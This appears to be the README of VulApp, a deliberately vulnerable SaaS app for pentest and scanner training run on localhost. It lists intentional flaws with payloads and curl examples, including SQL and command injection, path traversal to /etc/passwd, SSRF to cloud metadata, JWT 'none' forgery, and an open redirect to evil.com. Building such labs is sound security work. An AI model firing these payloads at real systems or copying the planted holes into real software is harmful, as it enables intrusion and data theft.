# VulApp - Deliberately Vulnerable SaaS Platform

VulApp is a deliberately vulnerable SaaS platform built for security testing, manual pentesting, automated scanning (Burp/ZAP), and AI-driven gray-box testing. It contains **20+ intentional security vulnerabilities** across authentication, authorization, injection, business logic, and more.

## 🚀 Quick Start (Docker)

Ensure you have Docker and Docker Compose installed.

1.  **Clone and Start**:
    ```bash
    docker-compose up --build
    ```
2.  **Access the App**:
    - Frontend: [http://localhost:5173](http://localhost:5173)
    - Backend API: [http://localhost:5001/api](http://localhost:5001/api)
    - API Documentation: [http://localhost:5001/api/docs](http://localhost:5001/api/docs)

## 👤 Test Credentials

- **Email**: `test@example.com`
- **Password**: `123456`

---

## 🛡️ Vulnerability Inventory (20+)

### 1. Authentication & Session Management
| # | Vulnerability | Endpoint | Exploit |
|---|---|---|---|
| 1 | Weak JWT Secret | All authenticated endpoints | Secret is `secret123` — forge tokens trivially |
| 2 | JWT `none` Algorithm Bypass | All authenticated endpoints | Send unsigned JWT with `alg: "none"` header |
| 3 | No Rate Limiting | `POST /api/auth/login`, `/register` | Brute-force credentials freely |
| 4 | Plaintext Password Storage | Database | Passwords stored as-is, no hashing |
| 5 | User Enumeration | `POST /api/auth/register` | Different errors for existing vs new emails |
| 6 | Insecure Password Reset | `POST /api/auth/forgot-password` | Predictable token (base64 email+timestamp), leaked in response |

### 2. Authorization & Access Control
| # | Vulnerability | Endpoint | Exploit |
|---|---|---|---|
| 7 | IDOR (Read) | `GET /api/projects/:id` | Access any project by guessing IDs |
| 8 | IDOR (Delete) | `DELETE /api/projects/:id` | Delete any project without ownership |
| 9 | IDOR (Update) | `PUT /api/projects/:id` | Update any project without ownership |
| 10 | Broken Admin Access | `GET /api/admin?admin=true` | Query param bypass leaks all user data + passwords |
| 11 | Mass Assignment | `PUT /api/auth/profile` | Set `plan_type`, `password`, or any field |

### 3. Injection
| # | Vulnerability | Endpoint | Payload |
|---|---|---|---|
| 12 | SQL Injection | `GET /api/projects/search/name?name=` | `' OR '1'='1` |
| 13 | Stored XSS | `POST /api/projects` (description field) | `<img src=x onerror=alert(1)>` |
| 14 | Command Injection | `GET /api/utils/ping?host=` | `; cat /etc/passwd` |
| 15 | Prototype Pollution | `POST /api/utils/merge` | `{"__proto__": {"isAdmin": true}}` |
| 16 | CSV Injection | `GET /api/projects/export/csv` | Create project with name `=CMD("calc")` |

### 4. File Handling
| # | Vulnerability | Endpoint | Exploit |
|---|---|---|---|
| 17 | Unrestricted File Upload | `POST /api/files/upload` | Upload `.html`, `.js`, `.php` — no validation |
| 18 | Direct File Execution | `GET /uploads/<filename>` | Uploaded HTML/JS files execute in browser |
| 19 | Path Traversal | `GET /api/files/download?name=` | `../../etc/passwd` |

### 5. Business Logic
| # | Vulnerability | Endpoint | Exploit |
|---|---|---|---|
| 20 | Subscription Bypass | `POST /api/subscribe` | Set `plan_type` to `"enterprise"` freely |

### 6. Server-Side Vulnerabilities
| # | Vulnerability | Endpoint | Exploit |
|---|---|---|---|
| 21 | SSRF | `GET /api/fetch-url?url=` | `http://169.254.169.254/latest/meta-data` |
| 22 | Sensitive Data Exposure | `GET /api/debug` | Leaks JWT secret, DB path, env vars |
| 23 | ReDoS | `POST /api/utils/validate-email` | `aaaaaaaaaaaaaaaaaaaaaaaaa!` |

### 7. Misconfiguration
| # | Vulnerability | Location | Details |
|---|---|---|---|
| 24 | CORS Wildcard | Server middleware | `Access-Control-Allow-Origin: *` |
| 25 | Stack Traces in Errors | Error handler | Full stack traces returned in 500 responses |
| 26 | Open Redirect | `GET /api/utils/redirect?url=` | `https://evil.com` |
| 27 | HTTP Header Injection | `GET /api/utils/lang?lang=` | `en%0d%0aX-Injected: true` |

---

## 🛠️ API Examples (CURL)

**Login**:
```bash
curl -X POST http://localhost:5001/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email":"test@example.com", "password":"123456"}'
```

**SQL Injection Search**:
```bash
curl "http://localhost:5001/api/projects/search/name?name='%20OR%20'1'='1"
```

**Command Injection**:
```bash
curl "http://localhost:5001/api/utils/ping?host=;id"
```

**JWT None Algorithm Bypass** (forge any identity):
```bash
# Header: {"alg":"none","typ":"JWT"}  →  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"id":1,"email":"admin@vulapp.com","plan":"enterprise"}  →  eyJpZCI6MSwiZW1haWwiOiJhZG1pbkB2dWxhcHAuY29tIiwicGxhbiI6ImVudGVycHJpc2UifQ
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkB2dWxhcHAuY29tIiwicGxhbiI6ImVudGVycHJpc2UifQ." \
     http://localhost:5001/api/auth/profile
```

**Path Traversal**:
```bash
curl "http://localhost:5001/api/files/download?name=../../etc/passwd"
```

**Mass Assignment** (upgrade to enterprise for free):
```bash
TOKEN="<your-jwt-token>"
curl -X PUT http://localhost:5001/api/auth/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"plan_type": "enterprise"}'
```

**Prototype Pollution**:
```bash
curl -X POST http://localhost:5001/api/utils/merge \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"isAdmin": true}}'
```

**SSRF**:
```bash
curl "http://localhost:5001/api/fetch-url?url=http://localhost:5001/api/debug"
```

**Admin Panel (Password Leak)**:
```bash
curl "http://localhost:5001/api/admin?admin=true"
```

**Full API Documentation**:
```bash
curl http://localhost:5001/api/docs
```

---

## 🧪 Gray-Box Testing Info

The app exposes partial internal information to assist AI-driven testing:

- **`GET /api/docs`**: Full API documentation with all endpoints, parameters, and known vulnerability types
- **Test User**: `test@example.com` / `123456`
- **JWT Secret**: `secret123`
- **Example JWT**: Available in `/api/docs` response

---

## 🛠️ Troubleshooting (Docker Issues)

If you encounter an "invalid ELF header" error or Node version issues:
1.  **Clean Up**:
    ```bash
    docker-compose down -v
    rm -rf backend/node_modules frontend/node_modules
    ```
2.  **Rebuild**:
    ```bash
    docker-compose up --build
    ```
This ensures host-specific binaries (like macOS `sqlite3`) don't conflict with the Linux container environment.
